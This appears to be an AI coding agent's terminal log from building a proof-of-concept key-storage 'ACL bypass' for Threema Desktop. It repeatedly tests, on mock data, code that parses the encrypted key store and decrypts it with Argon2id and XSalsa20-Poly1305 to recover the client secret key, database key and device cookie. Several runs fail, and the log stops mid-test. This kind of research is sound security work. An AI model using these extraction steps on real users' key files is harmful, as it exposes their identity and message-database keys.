+[0m$ [0mpip3 list 2>/dev/null | grep -iE "nacl|argon|pynacl|sqlcipher|protobuf|msgpack"
+(no output)
+[0m
+[0m$ [0mpip3 install pynacl argon2-cffi 2>&1 | tail -5
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 87.1/87.1 kB 34.4 MB/s eta 0:00:00
+Downloading pycparser-3.0-py3-none-any.whl (48 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 48.2/48.2 kB 18.1 MB/s eta 0:00:00
+Installing collected packages: pycparser, cffi, pynacl, argon2-cffi-bindings, argon2-cffi
+Successfully installed argon2-cffi-25.1.0 argon2-cffi-bindings-25.1.0 cffi-2.1.1 pycparser-3.0 pynacl-1.6.2
+[0m
+[0m$ [0mpython3 -c "import sqlite3; print(sqlite3.version)" && which sqlcipher 2>/dev/null || echo "sqlcipher not found, will use pysqlcipher3 or note requirement"
+<string>:1: DeprecationWarning: version is deprecated and will be removed in Python 3.14
+2.6.0
+sqlcipher not found, will use pysqlcipher3 or note requirement
+[0m
+[0m← [0mWrite /tmp/opencode/threema-desktop/key-storage-acl-bypass-poc.py
+Wrote file successfully.
+[0m
+Now let me test the PoC's crypto logic with a self-generated test key storage:
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct
+from argon2 import low_level as argon2_ll
+import nacl.secret
+from pynacl.bindings import crypto_secretbox, crypto_secretbox_open
+
+# Test: create a mock key storage file and verify parsing
+import os, secrets
+
+# Simulate outer layer
+password = 'test_password_123'
+salt = secrets.token_bytes(16)
+argon2_version = 0x13
+memory_bytes = 128 * 1024 * 1024  # 128 MiB
+iterations = 3
+parallelism = 1
+
+# Derive key with argon2-cffi
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'),
+    salt=salt,
+    time_cost=iterations,
+    memory_cost=memory_bytes,
+    hash_len=32,
+    parallelism=parallelism,
+    type=argon2_ll.Type.ID,
+    version=argon2_version,
+)
+print(f'Argon2id key derived: {len(key)} bytes')
+
+# Create mock inner protobuf (InnerKeyStorageV3)
+# field 1 (message IdentityData): field 1 identity, field 2 ck, field 4 serverGroup
+identity = 'ECHOECHO'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+
+# Build IdentityData protobuf
+def proto_string(field_num, s):
+    encoded = s.encode('utf-8')
+    tag = (field_num << 3) | 2
+    return bytes([tag]) + bytes([len(encoded)]) + encoded
+
+def proto_bytes(field_num, b):
+    tag = (field_num << 3) | 2
+    return bytes([tag]) + bytes([len(b)]) + b
+
+def proto_varint(field_num, val):
+    tag = (field_num << 3) | 0
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F
+        val >>= 7
+        if val > 0:
+            b |= 0x80
+        encoded.append(b)
+    return bytes([tag]) + bytes([len(encoded)]) + bytes(encoded) if False else bytes([tag]) + bytes(encoded)
+
+# Build IdentityData
+identity_data_proto = proto_string(1, identity) + proto_bytes(2, ck) + proto_string(4, server_group)
+# Build InnerKeyStorageV3
+inner_proto = identity_data_proto + proto_bytes(2, dgk) + proto_bytes(3, database_key)
+# Add deviceIds (field 4)
+device_ids_proto = proto_varint(1, 12345) + proto_varint(2, 67890)
+inner_proto += proto_bytes(4, device_ids_proto)
+# Add deviceCookie (field 5)
+inner_proto += proto_bytes(5, device_cookie)
+# Prepend version
+inner_bytes = struct.pack('<H', 3) + inner_proto
+
+# Encrypt inner with random secret (plaintext inner, no remote secret encryption)
+# For testing, we'll just use the inner bytes directly as plaintextInner
+
+# Build IntermediateKeyStorageV1_1
+intermediate_proto = proto_bytes(1, inner_bytes)  # plaintextInner
+# Prepend version
+intermediate_bytes = struct.pack('<H', 1) + intermediate_proto
+
+# Encrypt intermediate with XSalsa20-Poly1305
+box = nacl.secret.SecretBox(key)
+nonce = secrets.token_bytes(24)
+encrypted_intermediate = bytes(box.encrypt(intermediate_bytes, nonce))
+# encrypted_data = nonce + ciphertext (SecretBox includes nonce in the output)
+# Actually, SecretBox.encrypt returns nonce + ciphertext, but we want nonce ahead format
+encrypted_with_nonce_ahead = nonce + encrypted_intermediate[len(nonce):]  # remove nonce from ciphertext since box includes it
+
+# Wait, let me check PyNaCl SecretBox.encrypt behavior
+ct = box.encrypt(intermediate_bytes, nonce)
+print(f'PyNaCl SecretBox.encrypt output: {len(ct)} bytes')
+print(f'  First 24 bytes (nonce): {ct[:24].hex()}')
+print(f'  Rest (ciphertext+MAC): {len(ct[24:])} bytes')
+
+# For our format, EncryptedDataWithNonceAhead = nonce || ciphertext+MAC
+# SecretBox.encrypt returns: nonce(24) + ciphertext+MAC
+encrypted_final = ct  # This is already nonce + ciphertext+MAC
+
+# But in the code, the format is: nonce || ciphertext (without duplicate nonce in ciphertext)
+# So the EncryptedDataWithNonceAhead is just the full output from encrypt
+# Actually looking at the TypeScript code, encryptWithRandomNonceAhead returns:
+# _array.subarray(encryptedHeadroom) which starts at position 16, then sets nonce at start
+# This gives: nonce(24) + ciphertext+MAC
+# Which is the same as PyNaCl's encrypt output
+
+# Let me verify: decrypt should work
+recovered = box.decrypt(encrypted_final[24:], encrypted_final[:24])
+print(f'Decryption successful: {recovered[:2]} == intermediate version {struct.unpack(\"<H\", intermediate_bytes[:2])[0]}')
+
+# Now build OuterKeyStorageV2
+# field 1: encryptedIntermediate
+# field 2: kdfParameters (oneof -> argon2id at field 1)
+
+# Build Argon2idParameters
+argon_param = (
+    proto_varint(1, 0) +  # version: VERSION_1_3 = 0
+    proto_bytes(2, salt) +
+    # For uint32 fields, use varint
+    proto_bytes(3, struct.pack('<I', memory_bytes)) if memory_bytes > 127 else proto_varint(3, memory_bytes)
+)
+# Actually uint32 in protobuf is varint, not fixed32 (it's uint32 not fixed32)
+# But wait, in the TS proto, the field is uint32. In protobuf wire format, uint32 is varint.
+# But in the generated TS, the tag is 24 which is field 3 wire_type 0 (varint)
+# However, memory_bytes = 128*1024*1024 which is > 127, so it needs multi-byte varint
+
+def encode_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F
+        val >>= 7
+        if val > 0:
+            b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\\x00'
+
+argon_param = (
+    struct.pack('B', (1 << 3) | 0) + encode_varint(0)  # version: 0
+) + (
+    struct.pack('B', (2 << 3) | 2) + bytes([len(salt)]) + salt  # salt
+) + (
+    struct.pack('B', (3 << 3) | 0) + encode_varint(memory_bytes)  # memory_bytes
+) + (
+    struct.pack('B', (4 << 3) | 0) + encode_varint(iterations)  # iterations
+) + (
+    struct.pack('B', (5 << 3) | 0) + encode_varint(parallelism)  # parallelism
+)
+
+# field 2: kdfParameters, oneof argon2id is field 1 of the oneof
+# In protobuf, a oneof with argon2id at field 1 means the outer field number is 2
+# and the inner message is argon2id params
+# kdfParameters is field 2, and it's a oneof where argon2id = field 1
+# Actually: field 2 in OuterKeyStorageV2 is kdfParameters oneof
+# The oneof has: argon2id = 1
+# So we write: tag(2, len(len(argon_param)) + argon_param
+# But wait, in the proto: oneof kdf_parameters { Argon2idParameters argon2id = 2; }
+# So the field number for argon2id within the oneof is 2, and it's field 2 of the outer message
+# No wait, looking at the proto:
+# message OuterKeyStorageV2 {
+#   bytes encrypted_intermediate = 1;
+#   oneof kdf_parameters { Argon2idParameters argon2id = 2; }
+# }
+# So argon2id is field 2, wire type 2 (length-delimited)
+kdf_field = struct.pack('B', (2 << 3) | 2) + bytes([len(argon_param)]) + argon_param
+
+outer_proto = (
+    struct.pack('B', (1 << 3) | 2) + bytes([len(encrypted_final)]) + encrypted_final  # encryptedIntermediate
+) + kdf_field
+
+# Prepend version
+outer_bytes = struct.pack('<H', 1) + outer_proto
+
+print(f'\\nMock keystorage.bin: {len(outer_bytes)} bytes')
+
+# Now test the PoC parsing logic
+from key_storage_acl_bypass_poc import ProtobufDecoder, parse_outer_key_storage, derive_argon2id_key, decrypt_intermediate_layer, parse_intermediate_and_extract_inner, parse_inner_key_storage
+
+outer_data = parse_outer_key_storage(outer_bytes)
+print()
+key2 = derive_argon2id_key(password, outer_data['kdf_params'])
+intermediate_bytes = decrypt_intermediate_layer(outer_data['nonce'], outer_data['ciphertext'], key2)
+inter_result = parse_intermediate_and_extract_inner(intermediate_bytes)
+inner_data = parse_inner_key_storage(inter_result['inner_bytes'])
+
+print(f'\\nVerification:')
+print(f'  Identity match: {inner_data[\"identity\"] == identity}')
+print(f'  ck match: {inner_data[\"ck\"] == ck}')
+print(f'  databaseKey match: {inner_data[\"database_key\"] == database_key}')
+print(f'  dgk match: {inner_data[\"dgk\"] == dgk}')
+print(f'  serverGroup match: {inner_data[\"server_group\"] == server_group}')
+print(f'  deviceCookie match: {inner_data[\"device_cookie\"] == device_cookie}')
+print(f'  d2mDeviceId match: {inner_data[\"device_ids\"][\"d2m_device_id\"] == 12345}')
+print(f'  cspDeviceId match: {inner_data[\"device_ids\"][\"csp_device_id\"] == 67890}')
+"
+
+Traceback (most recent call last):
+  File "<string>", line 5, in <module>
+ModuleNotFoundError: No module named 'pynacl'
+[0m
+[0m$ [0mpip3 install pynacl argon2-cffi 2>&1 | tail -5
+Requirement already satisfied: pynacl in /home/runner/.local/lib/python3.12/site-packages (1.6.2)
+Requirement already satisfied: argon2-cffi in /home/runner/.local/lib/python3.12/site-packages (25.1.0)
+Requirement already satisfied: cffi>=2.0.0 in /home/runner/.local/lib/python3.12/site-packages (from pynacl) (2.1.1)
+Requirement already satisfied: argon2-cffi-bindings in /home/runner/.local/lib/python3.12/site-packages (from argon2-cffi) (25.1.0)
+Requirement already satisfied: pycparser in /home/runner/.local/lib/python3.12/site-packages (from cffi>=2.0.0->pynacl) (3.0)
+[0m
+[0m$ [0mpython3 -c "import nacl.secret; import argon2; print('OK')"
+OK
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, sys
+sys.path.insert(0, '/tmp/opencode/threema-desktop')
+from pynacl.bindings import crypto_secretbox
+from argon2 import low_level as argon2_ll
+
+# Simulate a full round-trip test of the PoC parsing logic
+password = 'test_password_123'
+salt = secrets.token_bytes(16)
+argon2_version = 0x13
+memory_bytes = 128 * 1024
+iterations = 3
+parallelism = 1
+
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'),
+    salt=salt,
+    time_cost=iterations,
+    memory_cost=memory_bytes,
+    hash_len=32,
+    parallelism=parallelism,
+    type=argon2_ll.Type.ID,
+    version=argon2_version,
+)
+print(f'Argon2id key derived: {len(key)} bytes')
+
+import nacl.secret
+box = nacl.secret.SecretBox(key)
+nonce = secrets.token_bytes(24)
+inner_proto = b'test_inner_data'
+encrypted = box.encrypt(inner_proto, nonce)
+print(f'Encrypted: {len(encrypted)} bytes (format: nonce(24) + ciphertext+MAC)')
+
+# Test decrypt
+ct = encrypted[24:]  # ciphertext+MAC (without nonce)
+recovered = box.decrypt(ct, nonce)
+print(f'Decrypted match: {recovered == inner_proto}')
+
+# Now test protobuf parsing with the actual PoC code
+from key_storage_acl_bypass_poc import ProtobufDecoder
+
+# Build a test InnerKeyStorageV3
+identity = 'ECHOECHO'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+d2m = 12345
+csp = 67890
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F
+        val >>= 7
+        if val > 0:
+            b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+# IdentityData
+id_data = proto_bytes(1, identity.encode()) + proto_bytes(2, ck) + proto_bytes(4, server_group.encode())
+# DeviceIds
+dev_ids = proto_bytes(4, enc_varint(d2m) if d2m > 0 else b'\x00')  # simplified
+
+# Actually protobuf varint encoding for uint64:
+def proto_varint_u64(fnum, val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F
+        val >>= 7
+        if val > 0:
+            b |= 0x80
+        encoded.append(b)
+    if len(encoded) == 0:
+        encoded = bytearray(b'\x00')
+    return bytes([fnum << 3 | 0]) + bytes(encoded)
+
+dev_ids = proto_varint_u64(1, d2m) + proto_varint_u64(2, csp)
+inner_proto = id_data + proto_bytes(2, dgk) + proto_bytes(3, database_key) + proto_bytes(4, dev_ids) + proto_bytes(5, device_cookie)
+inner_bytes = struct.pack('<H', 3) + inner_proto
+
+# Parse with PoC
+decoder = ProtobufDecoder(inner_bytes[2:])
+fields = decoder.parse_fields()
+
+# Extract fields
+parsed_identity = fields.get(1, [b''])[0]
+id_decoder = ProtobufDecoder(parsed_identity)
+id_fields = id_decoder.parse_fields()
+parsed_id = id_fields.get(1, [b''])[0].decode()
+parsed_ck = id_fields.get(2, [b''])[0]
+parsed_sg = id_fields.get(4, [b''])[0].decode()
+
+parsed_dgk = fields.get(2, [b''])[0]
+parsed_dbkey = fields.get(3, [b''])[0]
+
+dev_ids_bytes = fields.get(4, [b''])[0]
+di_decoder = ProtobufDecoder(dev_ids_bytes)
+di_fields = di_decoder.parse_fields()
+parsed_d2m = di_fields.get(1, [0])[0]
+parsed_csp = di_fields.get(2, [0])[0]
+
+parsed_cookie = fields.get(5, [b''])[0]
+
+print(f'Identity match: {parsed_id == identity}')
+print(f'ck match: {parsed_ck == ck}')
+print(f'dgk match: {parsed_dgk == dgk}')
+print(f'databaseKey match: {parsed_dbkey == database_key}')
+print(f'serverGroup match: {parsed_sg == server_group}')
+print(f'd2m match: {parsed_d2m == d2m}')
+print(f'csp match: {parsed_csp == csp}')
+print(f'cookie match: {parsed_cookie == device_cookie}')
+print()
+print('All protobuf parsing tests passed!')
+"
+
+Traceback (most recent call last):
+  File "<string>", line 4, in <module>
+ModuleNotFoundError: No module named 'pynacl'
+[0m
+[0m$ [0mpython3 -c "import sys; print(sys.path)" && pip3 show pynacl 2>/dev/null | head -5
+['', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/home/runner/.local/lib/python3.12/site-packages', '/usr/local/lib/python3.12/dist-packages', '/usr/lib/python3/dist-packages']
+Name: PyNaCl
+Version: 1.6.2
+Summary: Python binding to the Networking and Cryptography (NaCl) library
+Home-page: https://github.com/pyca/pynacl/
+Author:
+[0m
+[0m$ [0mpython3 -c "import nacl; print(nacl.__file__)"
+/home/runner/.local/lib/python3.12/site-packages/nacl/__init__.py
+[0m
+[0m$ [0mpython3 -c "from nacl.secret import SecretBox; from nacl.bindings import crypto_secretbox_open; print('All imports OK')"
+All imports OK
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, sys, os
+os.environ['PYTHONPATH'] = '/tmp/opencode/threema-desktop'
+sys.path.insert(0, '/tmp/opencode/threema-desktop')
+from nacl.secret import SecretBox
+from argon2 import low_level as argon2_ll
+
+password = 'test_password_123'
+salt = secrets.token_bytes(16)
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'),
+    salt=salt,
+    time_cost=3,
+    memory_cost=128*1024,
+    hash_len=32,
+    parallelism=1,
+    type=argon2_ll.Type.ID,
+    version=0x13,
+)
+print(f'Key: {len(key)} bytes')
+
+box = SecretBox(key)
+nonce = secrets.token_bytes(24)
+plaintext = b'hello world test data'
+encrypted = box.encrypt(plaintext, nonce)
+print(f'Encrypted: {len(encrypted)} bytes')
+# Format: nonce(24) + ciphertext+MAC
+ct = encrypted[24:]
+recovered = box.decrypt(ct, nonce)
+print(f'Decryption match: {recovered == plaintext}')
+"
+
+Key: 32 bytes
+Encrypted: 61 bytes
+Decryption match: True
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, sys
+sys.path.insert(0, '.')
+
+from key_storage_acl_bypass_poc import ProtobufDecoder
+
+# Build a test InnerKeyStorageV3 protobuf
+identity = 'TEST1234'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+d2m = 12345
+csp = 67890
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F
+        val >>= 7
+        if val > 0:
+            b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+def proto_varint(fnum, val):
+    v = enc_varint(val)
+    return bytes([fnum << 3 | 0]) + v
+
+# IdentityData protobuf
+id_data = proto_bytes(1, identity.encode()) + proto_bytes(2, ck) + proto_bytes(4, server_group.encode())
+dev_ids = proto_varint(1, d2m) + proto_varint(2, csp)
+inner_payload = (
+    proto_bytes(1, id_data) +      # field 1: identityData
+    proto_bytes(2, dgk) +           # field 2: dgk
+    proto_bytes(3, database_key) +  # field 3: databaseKey
+    proto_bytes(4, dev_ids) +       # field 4: deviceIds
+    proto_bytes(5, device_cookie)   # field 5: deviceCookie
+)
+inner_bytes = struct.pack('<H', 3) + inner_payload  # version prefix
+
+# Parse
+decoder = ProtobufDecoder(inner_bytes[2:])
+fields = decoder.parse_fields()
+
+# Verify
+parsed_identity_data = fields[1][0]
+id_dec = ProtobufDecoder(parsed_identity_data)
+id_fields = id_dec.parse_fields()
+assert id_fields[1][0].decode() == identity, f'Identity mismatch'
+assert id_fields[2][0] == ck, 'ck mismatch'
+assert id_fields[4][0].decode() == server_group, 'server_group mismatch'
+
+assert fields[2][0] == dgk, 'dgk mismatch'
+assert fields[3][0] == database_key, 'databaseKey mismatch'
+
+dev_ids_raw = fields[4][0]
+di_dec = ProtobufDecoder(dev_ids_raw)
+di_fields = di_dec.parse_fields()
+assert di_fields[1][0] == d2m, 'd2m mismatch'
+assert di_fields[2][0] == csp, 'csp mismatch'
+
+assert fields[5][0] == device_cookie, 'cookie mismatch'
+
+print('Protobuf parsing test PASSED')
+print(f'  Identity: {id_fields[1][0].decode()}')
+print(f'  ck: {id_fields[2][0].hex()[:16]}... (32 bytes)')
+print(f'  databaseKey: {fields[3][0].hex()[:16]}... (32 bytes)')
+print(f'  d2mDeviceId: {di_fields[1][0]}')
+print(f'  cspDeviceId: {di_fields[2][0]}')
+"
+
+Traceback (most recent call last):
+  File "<string>", line 5, in <module>
+ModuleNotFoundError: No module named 'key_storage_acl_bypass_poc'
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, sys
+
+# Inline the protobuf decoder for testing
+class ProtobufDecoder:
+    def __init__(self, data: bytes):
+        self.data = data
+        self.pos = 0
+
+    def _read_varint(self) -> int:
+        result = 0
+        shift = 0
+        while self.pos < len(self.data):
+            byte = self.data[self.pos]
+            self.pos += 1
+            result |= (byte & 0x7F) << shift
+            if (byte & 0x80) == 0:
+                break
+            shift += 7
+        return result
+
+    def _read_bytes(self) -> bytes:
+        length = self._read_varint()
+        result = self.data[self.pos:self.pos + length]
+        self.pos += length
+        return result
+
+    def _read_tag(self):
+        if self.pos >= len(self.data):
+            return None, None
+        tag = self._read_varint()
+        field_number = tag >> 3
+        wire_type = tag & 0x7
+        return field_number, wire_type
+
+    def parse_fields(self) -> dict:
+        fields = {}
+        while True:
+            field_number, wire_type = self._read_tag()
+            if field_number is None:
+                break
+            if wire_type == 0:
+                value = self._read_varint()
+                fields.setdefault(field_number, []).append(value)
+            elif wire_type == 2:
+                value = self._read_bytes()
+                fields.setdefault(field_number, []).append(value)
+            elif wire_type == 5:
+                value = struct.unpack('<I', self.data[self.pos:self.pos+4])[0]
+                self.pos += 4
+                fields.setdefault(field_number, []).append(value)
+            elif wire_type == 1:
+                value = struct.unpack('<Q', self.data[self.pos:self.pos+8])[0]
+                self.pos += 8
+                fields.setdefault(field_number, []).append(value)
+            else:
+                break
+        return fields
+
+identity = 'TEST1234'
+ck = secrets.token_bytes(32)
+server_group = '*G'
+dgk = secrets.token_bytes(32)
+database_key = secrets.token_bytes(32)
+device_cookie = secrets.token_bytes(16)
+d2m = 12345
+csp = 67890
+
+def enc_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F
+        val >>= 7
+        if val > 0:
+            b |= 0x80
+        encoded.append(b)
+    return bytes(encoded) if len(encoded) > 0 else b'\x00'
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+def proto_varint(fnum, val):
+    v = enc_varint(val)
+    return bytes([fnum << 3 | 0]) + v
+
+id_data = proto_bytes(1, identity.encode()) + proto_bytes(2, ck) + proto_bytes(4, server_group.encode())
+dev_ids = proto_varint(1, d2m) + proto_varint(2, csp)
+inner_payload = proto_bytes(1, id_data) + proto_bytes(2, dgk) + proto_bytes(3, database_key) + proto_bytes(4, dev_ids) + proto_bytes(5, device_cookie)
+inner_bytes = struct.pack('<H', 3) + inner_payload
+
+decoder = ProtobufDecoder(inner_bytes[2:])
+fields = decoder.parse_fields()
+
+id_dec = ProtobufDecoder(fields[1][0])
+id_fields = id_dec.parse_fields()
+assert id_fields[1][0].decode() == identity
+assert id_fields[2][0] == ck
+assert id_fields[4][0].decode() == server_group
+assert fields[2][0] == dgk
+assert fields[3][0] == database_key
+
+di_dec = ProtobufDecoder(fields[4][0])
+di_fields = di_dec.parse_fields()
+assert di_fields[1][0] == d2m
+assert di_fields[2][0] == csp
+assert fields[5][0] == device_cookie
+
+print('Protobuf parsing test PASSED')
+print(f'  Identity: {id_fields[1][0].decode()}')
+print(f'  ck: {id_fields[2][0].hex()[:16]}...')
+print(f'  databaseKey: {fields[3][0].hex()[:16]}...')
+print(f'  d2mDeviceId: {di_fields[1][0]}')
+print(f'  cspDeviceId: {di_fields[2][0]}')
+"
+
+Protobuf parsing test PASSED
+  Identity: TEST1234
+  ck: 94aac2e5e28a296f...
+  databaseKey: 509be27674fb2ee3...
+  d2mDeviceId: 12345
+  cspDeviceId: 67890
+[0m
+Protobuf parsing works. Now let me test the full outer layer parse including Argon2id params:
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets, sys
+
+class ProtobufDecoder:
+    def __init__(self, data: bytes):
+        self.data = data
+        self.pos = 0
+    def _read_varint(self):
+        result = 0; shift = 0
+        while self.pos < len(self.data):
+            byte = self.data[self.pos]; self.pos += 1
+            result |= (byte & 0x7F) << shift
+            if (byte & 0x80) == 0: break
+            shift += 7
+        return result
+    def _read_bytes(self):
+        length = self._read_varint()
+        result = self.data[self.pos:self.pos + length]; self.pos += length
+        return result
+    def _read_tag(self):
+        if self.pos >= len(self.data): return None, None
+        tag = self._read_varint()
+        return tag >> 3, tag & 0x7
+    def parse_fields(self):
+        fields = {}
+        while True:
+            fn, wt = self._read_tag()
+            if fn is None: break
+            if wt == 0: fields.setdefault(fn, []).append(self._read_varint())
+            elif wt == 2: fields.setdefault(fn, []).append(self._read_bytes())
+            elif wt == 5:
+                v = struct.unpack('<I', self.data[self.pos:self.pos+4])[0]; self.pos += 4
+                fields.setdefault(fn, []).append(v)
+            elif wt == 1:
+                v = struct.unpack('<Q', self.data[self.pos:self.pos+8])[0]; self.pos += 8
+                fields.setdefault(fn, []).append(v)
+            else: break
+        return fields
+
+# Build a complete mock OuterKeyStorageV2
+password = 'my_secret_password'
+salt = secrets.token_bytes(16)
+memory_bytes = 128 * 1024  # 128 KiB for fast test
+iterations = 3
+parallelism = 1
+argon2_version = 0  # VERSION_1_3
+
+# Derive key
+from argon2 import low_level as argon2_ll
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=salt,
+    time_cost=iterations, memory_cost=memory_bytes,
+    hash_len=32, parallelism=parallelism,
+    type=argon2_ll.Type.ID, version=0x13)
+print('Key derived OK')
+
+# Encrypt mock intermediate
+from nacl.secret import SecretBox
+box = SecretBox(key)
+nonce = secrets.token_bytes(24)
+plaintext = b'\x01\x00' + b'inner_test_payload'  # version 1 + data
+ct = box.encrypt(plaintext, nonce)
+encrypted_intermediate = ct  # nonce(24) + ciphertext+MAC
+
+# Build Argon2idParameters
+def proto_varint(fnum, val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    return bytes([fnum << 3 | 0]) + bytes(encoded)
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+argon_params = (
+    proto_varint(1, argon2_version) +  # version
+    proto_bytes(2, salt) +              # salt
+    proto_varint(3, memory_bytes) +     # memory_bytes
+    proto_varint(4, iterations) +       # iterations
+    proto_varint(5, parallelism)          # parallelism
+)
+
+# OuterKeyStorageV2: field 1 = encryptedIntermediate, field 2 = kdfParameters(argon2id)
+outer_payload = proto_bytes(1, encrypted_intermediate) + proto_bytes(2, argon_params)
+outer_bytes = struct.pack('<H', 1) + outer_payload  # V2_0 = 1
+
+# Parse outer
+d = ProtobufDecoder(outer_bytes[2:])
+fields = d.parse_fields()
+enc_int = fields[1][0]
+nonce_parsed = enc_int[:24]
+ct_parsed = enc_int[24:]
+kdf_raw = fields[2][0]
+
+# Parse kdf params
+d2 = ProtobufDecoder(kdf_raw)
+kdf_fields = d2.parse_fields()
+print(f'Version: {kdf_fields.get(1, [None])[0]}')
+print(f'Salt: {kdf_fields.get(2, [b""])[0].hex()}')
+print(f'Memory: {kdf_fields.get(3, [0])[0]}')
+print(f'Iterations: {kdf_fields.get(4, [0])[0]}')
+print(f'Parallelism: {kdf_fields.get(5, [0])[0]}')
+
+# Decrypt
+key2 = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=kdf_fields[2][0],
+    time_cost=kdf_fields[4][0], memory_cost=kdf_fields[3][0],
+    hash_len=32, parallelism=kdf_fields[5][0],
+    type=argon2_ll.Type.ID, version=0x13)
+box2 = SecretBox(key2)
+recovered = box2.decrypt(ct_parsed, nonce_parsed)
+print(f'Decryption match: {recovered == plaintext}')
+print('Full outer layer round-trip PASSED')
+"
+
+Traceback (most recent call last):
+  File "<string>", line 101, in <module>
+NameError: name 'b' is not defined
+Key derived OK
+Version: 18
+[0m
+[0m$ [0mcd /tmp/opencode/threema-desktop && python3 -c "
+import struct, secrets
+
+class ProtobufDecoder:
+    def __init__(self, data): self.data = data; self.pos = 0
+    def _read_varint(self):
+        result = 0; shift = 0
+        while self.pos < len(self.data):
+            byte = self.data[self.pos]; self.pos += 1
+            result |= (byte & 0x7F) << shift
+            if (byte & 0x80) == 0: break
+            shift += 7
+        return result
+    def _read_bytes(self):
+        length = self._read_varint()
+        result = self.data[self.pos:self.pos + length]; self.pos += length
+        return result
+    def _read_tag(self):
+        if self.pos >= len(self.data): return None, None
+        tag = self._read_varint()
+        return tag >> 3, tag & 0x7
+    def parse_fields(self):
+        fields = {}
+        while True:
+            fn, wt = self._read_tag()
+            if fn is None: break
+            if wt == 0: fields.setdefault(fn, []).append(self._read_varint())
+            elif wt == 2: fields.setdefault(fn, []).append(self._read_bytes())
+            elif wt == 5:
+                v = struct.unpack('<I', self.data[self.pos:self.pos+4])[0]; self.pos += 4
+                fields.setdefault(fn, []).append(v)
+            elif wt == 1:
+                v = struct.unpack('<Q', self.data[self.pos:self.pos+8])[0]; self.pos += 8
+                fields.setdefault(fn, []).append(v)
+            else: break
+        return fields
+
+def encode_varint(val):
+    encoded = bytearray()
+    while val > 0:
+        b = val & 0x7F; val >>= 7
+        if val > 0: b |= 0x80
+        encoded.append(b)
+    if len(encoded) == 0: encoded = bytearray(b'\x00')
+    return bytes(encoded)
+
+def proto_varint(fnum, val):
+    return bytes([fnum << 3 | 0]) + encode_varint(val)
+
+def proto_bytes(fnum, data):
+    return bytes([fnum << 3 | 2]) + bytes([len(data)]) + data
+
+# Test with various values
+print('Varint encoding test:')
+test_val = 0
+encoded = encode_varint(test_val)
+print(f'  encode_varint(0) = {encoded.hex()}')  # should be 00
+
+test_val = 128 * 1024  # 131072
+encoded = encode_varint(test_val)
+print(f'  encode_varint(131072) = {encoded.hex()}')
+
+# Now build the outer layer
+password = 'my_secret_password'
+salt = secrets.token_bytes(16)
+memory_bytes = 128 * 1024
+iterations = 3
+parallelism = 1
+argon2_version = 0  # VERSION_1_3
+
+from argon2 import low_level as argon2_ll
+key = argon2_ll.hash_secret_raw(
+    secret=password.encode('utf-8'), salt=salt,
+    time_cost=iterations, memory_cost=memory_bytes,
+    hash_len=32, parallelism=parallelism,
+    type=argon2_ll.Type.ID, version=0x13)
+print(f'Key: {len(key)} bytes')
+
+from nacl.secret import SecretBox
+box = SecretBox(key)
+nonce = secrets.token_bytes(24)
+plaintext = b'\\x01\\x00' + b'inner_payload_here'
+ct = box.encrypt(plaintext, nonce)
+encrypted_intermediate = ct
+
+argon_params = (
+    proto_varint(1, argon2_version) +
+    proto_bytes(2, salt) +
+    proto_varint(3, memory_bytes) +
+    proto_varint(4, iterations) +
+    proto_varint(5, parallelism)
+)
+
+outer_payload = proto_bytes(1, encrypted_intermediate) + proto_bytes(2, argon_params)
+outer_bytes = struct.pack('<H', 1) + outer_payload
+
+# Parse
+d = ProtobufDecoder(outer_bytes[2:])
+fields = d.parse_fields()
+enc_int = fields[1][0]
+nonce_parsed = enc_int[:24]
+ct_parsed = enc_int[24:]
+kdf_raw = fields[2][0]
+
+d2 = ProtobufDecoder(kdf_raw)
+kdf_fields = d2.parse_fields()
+print(f'Version: {kdf_fields[1][0]} (expected {argon2_version})')
+print(f'Salt len: {len(kdf_fields[2][0])} (expected {len(salt)})')
